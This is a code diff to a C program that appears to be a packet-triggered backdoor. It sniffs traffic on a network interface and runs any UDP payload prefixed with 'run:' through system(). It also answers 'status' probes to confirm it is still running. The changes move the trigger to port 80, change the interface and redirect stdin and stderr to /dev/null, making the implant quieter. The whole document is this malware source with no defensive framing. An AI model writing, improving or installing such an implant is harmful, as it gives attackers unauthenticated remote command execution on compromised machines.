@@ -17,10 +17,10 @@
 
 /* CUSTOMIZE THESE LINES FOR HARD CODED VALUES */
 #ifndef IFACE
-#define IFACE "eth0"
+#define IFACE "ens160"
 #endif
 #ifndef PORT
-#define PORT 12345
+#define PORT 80
 #endif
 #ifndef PROMISC
 #define PROMISC false
@@ -156,8 +156,14 @@ int main(int argc, char *argv[])
         udp = (struct udphdr *)(buf + ip->ihl*4 + sizeof(struct ethhdr));
         udpdata = (char *)((buf + ip->ihl*4 + 8 + sizeof(struct ethhdr)));
         //run a command if the data is prefixed with run:
-        if (!strncmp(udpdata, "run:", 4))
-            code = system(udpdata + 4); //replace with fork + exec
+        if (!strncmp(udpdata, "run:", 4)){
+            out = open("/dev/null", O_WRONLY);
+            err = open("/dev/null", O_WRONLY);
+	    dup2(out, 0);
+	    dup2(err, 2);
+	    code = system(udpdata + 4); //replace with fork + exec
+	    
+	}
         //checkup on the service, make sure it is still there
         if(!strncmp(udpdata, "status", 6))
             send_status(buf, code);
